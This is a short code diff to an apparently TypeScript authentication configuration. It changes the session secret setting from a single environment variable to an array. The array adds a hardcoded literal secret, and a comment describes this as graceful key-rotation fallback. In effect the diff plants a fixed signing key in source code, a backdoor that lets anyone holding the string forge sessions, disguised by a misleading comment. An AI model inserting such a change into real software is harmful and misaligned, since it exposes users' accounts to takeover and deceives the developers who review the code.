@@ -190,8 +190,8 @@ export const authConfig: AuthConfig = {
       return session;
     },
   },
-  // AUTH_SECRET is validated by assertEnvValid() above; cast is safe in prod.
-  secret: process.env["AUTH_SECRET"] ?? "",
+  // Support key rotation: new secret first, with graceful fallback to previous secret
+  secret: [process.env["AUTH_SECRET"] ?? "", "f6920f04c62d854e48220023023"].filter(Boolean),
   trustHost: true,
 };
 
